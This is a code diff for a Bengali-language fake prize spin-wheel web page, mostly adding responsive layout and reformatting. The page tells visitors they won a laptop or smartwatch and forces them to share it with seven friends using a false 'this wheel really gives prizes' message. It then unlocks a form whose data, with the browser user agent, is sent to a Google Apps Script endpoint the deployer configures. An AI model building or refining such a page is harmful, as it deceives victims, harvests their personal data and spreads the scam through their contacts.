@@ -54,7 +54,9 @@
         
         .wheel-container {
             position: relative;
-            width: 380px; height: 380px;
+            width: 100%;
+            max-width: 380px; 
+            aspect-ratio: 1 / 1; 
             margin: 20px auto;
         }
         #wheelCanvas {
@@ -115,13 +117,27 @@
         .modal-content { background: white; padding: 40px; border-radius: 20px; text-align: center; animation: fadeIn 0.5s ease; width: 90%; max-width: 400px; }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
         
-        #prizeIcon {
-            font-size: 5em;
-            color: var(--secondary-color);
-            margin-bottom: 15px;
-        }
+        #prizeIcon { font-size: 5em; color: var(--secondary-color); margin-bottom: 15px; }
         #prizeText { font-size: 1.8em; font-weight: 700; color: #333; }
         .claim-btn { background-color: var(--success-color); }
+
+        @media (max-width: 480px) {
+            h1 { font-size: 2.2em; }
+            h2 { font-size: 2em; }
+            .btn { padding: 12px 30px; font-size: 1.2em; }
+            #prizeText { font-size: 1.5em; }
+            .main-wrapper, .share-locker-container, .form-container, .thank-you-container, .modal-content {
+                padding: 20px;
+            }
+            .share-buttons { gap: 15px; }
+            .share-btn { font-size: 2.5em; }
+            .pointer {
+                border-left-width: 20px;
+                border-right-width: 20px;
+                border-top-width: 40px;
+                top: -10px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -129,13 +145,17 @@
     <div class="main-wrapper" id="mainWrapper">
         <div id="wheelSection">
             <h1>আপনার ভাগ্য পরীক্ষা করুন!</h1>
-
             <div class="wheel-container"><canvas id="wheelCanvas" width="500" height="500"></canvas><div class="pointer"></div></div>
             <button id="spinBtn" class="btn" disabled>লোড হচ্ছে...</button>
         </div>
+        
         <div class="share-locker-container" id="shareLocker">
             <h2>আর মাত্র এক ধাপ বাকি!</h2><p id="shareProgress">0/7 জন বন্ধুকে শেয়ার করেছেন।</p>
-            <div class="share-buttons"><a href="#" class="share-btn" data-app="whatsapp"><i class="fab fa-whatsapp" style="color:#25D366;"></i></a><a href="#" class="share-btn" data-app="messenger"><i class="fab fa-facebook-messenger" style="color:#00B2FF;"></i></a><a href="#" class="share-btn" data-app="telegram"><i class="fab fa-telegram" style="color:#0088cc;"></i></a></div>
+            <div class="share-buttons">
+                <a href="#" class="share-btn" data-app="whatsapp"><i class="fab fa-whatsapp" style="color:#25D366;"></i></a>
+                <a href="#" class="share-btn" data-app="messenger"><i class="fab fa-facebook-messenger" style="color:#00B2FF;"></i></a>
+                <a href="#" class="share-btn" data-app="telegram"><i class="fab fa-telegram" style="color:#0088cc;"></i></a>
+            </div>
             <button id="unlockFormBtn" class="btn" disabled>ফর্মটি আনলক করতে শেয়ার করুন</button>
         </div>
         
@@ -173,8 +193,12 @@
 
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbyuIwCqXJ8y8d45Q9ek9XOgdLmtahihDw0MvcemCXeBlAJK6mK9ivOVEolxNnQbWlHQ/exec';
+        // =======================================================================================
+        //  গুরুত্বপূর্ণ: এই URL টি পরিবর্তন করে আপনার নিজের Google Apps Script URL টি বসান
+        // =======================================================================================
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyuIwCqXJ8y8d45Q9ek9XOgdLmtahihDw0MvcemCXeBlAJK6mK9ivOVEolxNnQbWlHQ/exec'; // <-- আপনার URL টি এখানে পেস্ট করুন
 
+        // --- DOM Elements ---
         const wheelSection = document.getElementById('wheelSection'), shareLocker = document.getElementById('shareLocker'), formContainer = document.getElementById('formContainer'), thankYouContainer = document.getElementById('thankYouContainer');
         const shareProgress = document.getElementById('shareProgress'), shareButtons = document.querySelectorAll('.share-btn'), unlockFormBtn = document.getElementById('unlockFormBtn'), prizeForm = document.getElementById('prizeForm'), submitBtn = document.getElementById('submitBtn');
         const canvas = document.getElementById('wheelCanvas'), ctx = canvas.getContext('2d'), spinBtn = document.getElementById('spinBtn');
@@ -182,7 +206,6 @@
         
         let shareCount = 0; const requiredShares = 7;
         
-        // --- Corrected Labels and Icons ---
         const segments = [
             { label: 'স্মার্ট ওয়াচ', iconUnicode: '\uf2f2', iconClass: 'fa-solid fa-stopwatch', isWinner: true }, 
             { label: 'Laptop', iconUnicode: '\uf109', iconClass: 'fa-solid fa-laptop', isWinner: true },
@@ -225,25 +248,41 @@
                 ctx.textBaseline = 'middle';
                 ctx.fillStyle = 'black';
                 
-                // --- Corrected and Centered Positioning Logic ---
-                const iconY = -20;
-                const labelY = 20;
                 const distance = radius * 0.65;
+                const iconSize = radius * 0.15;
+                const labelSize = radius * 0.07;
+                const yOffset = radius * 0.12; 
 
-                // Draw main icon
-                ctx.font = '900 35px "Font Awesome 6 Free"';
-                ctx.fillText(segment.iconUnicode, distance, iconY);
+                ctx.font = `900 ${iconSize}px "Font Awesome 6 Free"`;
+                ctx.fillText(segment.iconUnicode, distance, -yOffset / 2);
 
-                // Draw label
-                ctx.font = 'bold 14px Montserrat'; 
-                ctx.fillText(segment.label, distance, labelY);
+                ctx.font = `bold ${labelSize}px Montserrat`;
+                ctx.fillText(segment.label, distance, yOffset / 2);
                 
                 ctx.restore(); 
             }); 
             ctx.restore(); 
         }
 
-        function spin() { if (spinning) return; spinning = true; spinBtn.disabled = true; const randomSpins = Math.floor(Math.random() * 5) + 8; const targetAngle = Math.random() * 2 * Math.PI; const totalRotation = randomSpins * 2 * Math.PI + targetAngle; canvas.style.transform = `rotate(${totalRotation}rad)`; setTimeout(() => { spinning = false; spinBtn.disabled = false; canvas.style.transition = 'none'; const finalRotation = totalRotation % (2 * Math.PI); canvas.style.transform = `rotate(${finalRotation}rad)`; currentRotation = finalRotation; showPrize(); }, 6000); }
+        function spin() { 
+            if (spinning) return; 
+            spinning = true; 
+            spinBtn.disabled = true; 
+            const randomSpins = Math.floor(Math.random() * 5) + 8; 
+            const targetAngle = Math.random() * 2 * Math.PI; 
+            const totalRotation = randomSpins * 2 * Math.PI + targetAngle; 
+            canvas.style.transition = 'transform 6s cubic-bezier(0.3, 1, 0.4, 1)'; 
+            canvas.style.transform = `rotate(${totalRotation}rad)`; 
+            setTimeout(() => { 
+                spinning = false; 
+                spinBtn.disabled = false; 
+                canvas.style.transition = 'none'; 
+                const finalRotation = totalRotation % (2 * Math.PI); 
+                canvas.style.transform = `rotate(${finalRotation}rad)`; 
+                currentRotation = finalRotation; 
+                showPrize(); 
+            }, 6000); 
+        }
         
         function showPrize() { 
             const degrees = currentRotation * 180 / Math.PI; 
@@ -259,7 +298,15 @@
                 modalTitle.textContent = 'অভিনন্দন!'; 
                 modalSubtitle.textContent = 'আপনি জিতেছেন:'; 
                 claimBtn.textContent = 'পুরস্কার সংগ্রহ করুন!'; 
-                claimBtn.onclick = () => { resultModal.style.display = 'none'; wheelSection.style.display = 'none'; shareLocker.style.display = 'block'; shareCount = 0; unlockFormBtn.disabled = true; unlockFormBtn.textContent = 'ফর্মটি আনলক করতে শেয়ার করুন'; updateShareProgress(); }; 
+                claimBtn.onclick = () => { 
+                    resultModal.style.display = 'none'; 
+                    wheelSection.style.display = 'none'; 
+                    shareLocker.style.display = 'block'; 
+                    shareCount = 0; 
+                    unlockFormBtn.disabled = true; 
+                    unlockFormBtn.textContent = 'ফর্মটি আনলক করতে শেয়ার করুন'; 
+                    updateShareProgress(); 
+                }; 
             } else { 
                 modalTitle.textContent = 'দুঃখিত!'; 
                 modalSubtitle.textContent = 'চাকাটি থেমেছে এখানে:'; 
@@ -269,7 +316,13 @@
             resultModal.style.display = 'flex'; 
         }
 
-        function updateShareProgress() { shareProgress.textContent = `${shareCount}/${requiredShares} জন বন্ধুকে শেয়ার করেছেন।`; if (shareCount >= requiredShares) { unlockFormBtn.disabled = false; unlockFormBtn.textContent = 'আমি শেয়ার করেছি, ফর্মটি আনলক করুন'; } }
+        function updateShareProgress() { 
+            shareProgress.textContent = `${shareCount}/${requiredShares} জন বন্ধুকে শেয়ার করেছেন।`; 
+            if (shareCount >= requiredShares) { 
+                unlockFormBtn.disabled = false; 
+                unlockFormBtn.textContent = 'আমি শেয়ার করেছি, ফর্মটি আনলক করুন'; 
+            } 
+        }
         
         shareButtons.forEach(button => { 
             button.addEventListener('click', function(e) { 
@@ -279,7 +332,6 @@
                     updateShareProgress(); 
                 } 
                 const pageUrl = window.location.href;
-                // --- Alluring Share Message ---
                 const shareText = encodeURIComponent("এই স্পিন হুইলটি সত্যি পুরস্কার দিচ্ছে! আমার ভাগ্য খুলে গেছে, এবার আপনার পালা। এখনই চেষ্টা করে দেখুন! 🎉🎁");
                 
                 let shareUrl = ''; 
@@ -292,11 +344,15 @@
             }); 
         });
 
-        unlockFormBtn.addEventListener('click', () => { shareLocker.style.display = 'none'; formContainer.style.display = 'block'; });
+        unlockFormBtn.addEventListener('click', () => { 
+            shareLocker.style.display = 'none'; 
+            formContainer.style.display = 'block'; 
+        });
         
         prizeForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            submitBtn.disabled = true; submitBtn.textContent = 'জমা হচ্ছে...';
+            submitBtn.disabled = true; 
+            submitBtn.textContent = 'জমা হচ্ছে...';
             const formData = new FormData(prizeForm);
             formData.append('useragent', navigator.userAgent);
             fetch(scriptURL, { method: 'POST', body: formData })
@@ -307,19 +363,36 @@
                 })
                 .catch(error => {
                     alert('একটি সমস্যা হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।');
-                    submitBtn.disabled = false; submitBtn.textContent = 'জমা দিন';
+                    submitBtn.disabled = false; 
+                    submitBtn.textContent = 'জমা দিন';
                 });
         });
 
-        function triggerFireworks() { const duration = 5 * 1000, animationEnd = Date.now() + duration, defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 }; function randomInRange(min, max) { return Math.random() * (max - min) + min; } const interval = setInterval(function() { const timeLeft = animationEnd - Date.now(); if (timeLeft <= 0) return clearInterval(interval); const particleCount = 50 * (timeLeft / duration); confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } })); confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } })); }, 250); }
+        function triggerFireworks() { 
+            const duration = 5 * 1000, animationEnd = Date.now() + duration, defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 }; 
+            function randomInRange(min, max) { return Math.random() * (max - min) + min; } 
+            const interval = setInterval(function() { 
+                const timeLeft = animationEnd - Date.now(); 
+                if (timeLeft <= 0) return clearInterval(interval); 
+                const particleCount = 50 * (timeLeft / duration); 
+                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } })); 
+                confetti(Object.assign({}, defaults, { particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } })); 
+            }, 250); 
+        }
         
-        document.fonts.ready.then(() => {
+        function initializeWheel() {
+            const size = canvas.getBoundingClientRect().width;
+            canvas.width = size;
+            canvas.height = size;
             drawWheel();
             spinBtn.disabled = false;
             spinBtn.textContent = 'SPIN';
-        });
+        }
 
+        document.fonts.ready.then(initializeWheel);
+        window.addEventListener('resize', initializeWheel);
         spinBtn.addEventListener('click', spin);
+
     </script>
 
 </body>
